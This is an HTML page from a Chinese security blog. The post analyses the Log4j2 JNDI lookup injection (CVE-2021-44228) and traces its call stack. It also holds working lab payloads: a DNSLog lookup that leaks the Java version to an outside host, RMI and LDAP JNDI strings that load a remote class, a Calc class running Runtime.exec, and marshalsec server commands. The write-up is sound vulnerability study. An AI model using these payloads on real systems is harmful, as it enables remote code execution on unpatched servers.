@@ -1,0 +1,346 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Log4j2 lookup JNDI注入(CVE-2021-44228) | n2ryx&#39;s Blog</title>
+  <meta name="author" content="n2ryx">
+  
+  <meta name="description" content="Log4j2 lookup JNDI注入(CVE-2021-44228)漏洞概述Log4j2在处理消息转换时，会按照字符检测每条日志，当日志中包含${}时，则会将表达式的内容替换成真实的内容(即lookup接口查找得到的内容），使用LDAP或RMI协议，能从远程服务区上请求恶意的对象，对象在调用的过程中会被解析执行，导致了Log4j2的漏洞
+影响版本
+Apache Log4j 2.x &amp;lt;&amp;#x3D; 2.14.1
+Log4j2依赖
+1234567891011&amp;lt;dependency&amp;gt;    &amp;lt;groupId&amp;gt;org.apache.logging.log4j&amp;lt;/groupId&amp;gt;    &amp;lt;artifactId&amp;gt;log4j-core&amp;lt;/artifactId&amp;gt;    &amp;lt;version&amp;gt;2.14.1&amp;lt;/version&amp;gt;&amp;lt;/dependency&amp;gt;&amp;lt;dependency&amp;gt;    &amp;lt;groupId&amp;gt;org.apache.logging.log4j&amp;lt;/groupId&amp;gt;	&amp;lt;artifactId&amp;gt;log4j-api&amp;lt;/artifactId&amp;gt;	&amp;lt;version&amp;gt;2.14.1&amp;lt;/version&amp;gt;&amp;lt;/dependency&amp;gt;
+
+
+DNSLog
+12345678910import org.apache.logging.log4j.Logger;import org.apache.logging.log4j.LogManager;public class Log4j2 &amp;#123;    private static final Logger logger = LogManager.getLogger(Log4j2.class);    public static void main(String[] args) &amp;#123;        logger.error(&amp;quot;$&amp;#123;jndi:ldap://$&amp;#123;sys:java.version&amp;#125;.hzitqenuvp.dgrh3.cn&amp;#125;&amp;quot;);    &amp;#125;&amp;#125;
+Java版本信息呈现"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Log4j2 lookup JNDI注入(CVE-2021-44228)"/>
+  <meta property="og:site_name" content="n2ryx&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="n2ryx&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">n2ryx&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tool" title="All the tools.">
+			  <i class="fa fa-terminal"></i>Tool
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Log4j2 lookup JNDI注入(CVE-2021-44228)</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h2 id="Log4j2-lookup-JNDI注入-CVE-2021-44228"><a href="#Log4j2-lookup-JNDI注入-CVE-2021-44228" class="headerlink" title="Log4j2 lookup JNDI注入(CVE-2021-44228)"></a>Log4j2 lookup JNDI注入(CVE-2021-44228)</h2><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>Log4j2在处理消息转换时，会按照字符检测每条日志，当日志中包含${}时，则会将表达式的内容替换成真实的内容(即lookup接口查找得到的内容），使用LDAP或RMI协议，能从远程服务区上请求恶意的对象，对象在调用的过程中会被解析执行，导致了Log4j2的漏洞</p>
+<p><strong>影响版本</strong></p>
+<p>Apache Log4j 2.x &lt;&#x3D; 2.14.1</p>
+<p><strong>Log4j2依赖</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p><strong>DNSLog</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Log4j2</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(Log4j2.class);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://$&#123;sys:java.version&#125;.hzitqenuvp.dgrh3.cn&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>Java版本信息呈现</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240325172653379.png" alt="image-20240325172653379"></p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>调用堆栈：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">LOGGER.error</span><br><span class="line">……</span><br><span class="line">MessagePatternConverter.format</span><br><span class="line">……</span><br><span class="line">StrSubstitutor.resolveVariable</span><br><span class="line">Interpolator.lookup</span><br><span class="line">JndiLookup.lookup</span><br><span class="line">JndiManager.lookup</span><br><span class="line">InitialContext.lookup</span><br></pre></td></tr></table></figure>
+
+<p><strong>MessagePatternConverter.format()</strong></p>
+<p>DNSLog代码中的<code>LOGGER.error()</code>方法最终会调用到MessagePatternConverter.format()方法，该方法对日志内容进行解析和格式化，并返回最终格式化后的日志内容。当碰到日志内容中包含${子串时，调用StrSubstitutor进行进一步解析</p>
+<p><strong>StrSubstitutor.resolveVariable()</strong></p>
+<p>StrSubstitutor将${和}之间的内容提取出来，调用并传递给Interpolator.lookup()方法，实现Lookup功能</p>
+<p><strong>Interpolator.lookup()</strong></p>
+<p>Interpolator实际是一个实现Lookup功能的代理类，该类在成员变量strLookupMap中保存着各类Lookup功能的真正实现类。Interpolator对 上一步提取出的内容解析后，从strLookupMap获得Lookup功能实现类，并调用实现类的lookup()方法</p>
+<p><strong>JndiLookup.lookup()</strong></p>
+<p>JndiLookup.lookup()方法调用JndiManager.lookup()方法，获取JNDI对象后，调用该对象上的toString()方法，最终返回该字符串</p>
+<p><strong>JndiManager.lookup()</strong></p>
+<p>直接委托给<code>InitialContext.lookup()</code>方法</p>
+<p>后续便是常规的JNDI注入路径进行分析</p>
+<h3 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI+RMI"></a>JNDI+RMI</h3><p>Log4j2.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Log4j2</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(Log4j2.class);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:rmi://192.168.6.110:9999/Calc&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Calc.java编译成class文件放在http服务下<code>(python -m http.server 80)</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>借助<a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">marshalsec</a>项目(测试Jdk8u211)，启动一个RMI服务器，监听9999端口，并制定加载远程类<code>Calc.class</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.6.110/#Calc&quot; 9999</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240325175647330.png" alt="image-20240325175647330"></p>
+<h3 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI+LDAP"></a>JNDI+LDAP</h3><p>Log4j2.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Log4j2</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(Log4j2.class);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://192.168.6.110:9999/Calc&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>marshalsec项目</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://192.168.6.110/#Calc&quot; 9999</span><br></pre></td></tr></table></figure>
+
+<p>具体参考fastjson1.2.24</p>
+
+	  <!--
+<div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+-->
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2024/04/12/vuln/2017 Fastjson 远程命令执行漏洞/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2024/03/27/java/JNDI/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-04-02 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Vuln/">Vuln<span>3</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/Log4j2/">Log4j2<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Log4j2-lookup-JNDI%E6%B3%A8%E5%85%A5-CVE-2021-44228"><span class="toc-article-text">Log4j2 lookup JNDI注入(CVE-2021-44228)</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-article-text">漏洞概述</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-article-text">漏洞原理</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#JNDI-RMI"><span class="toc-article-text">JNDI+RMI</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#JNDI-LDAP"><span class="toc-article-text">JNDI+LDAP</span></a></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 n2ryx's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
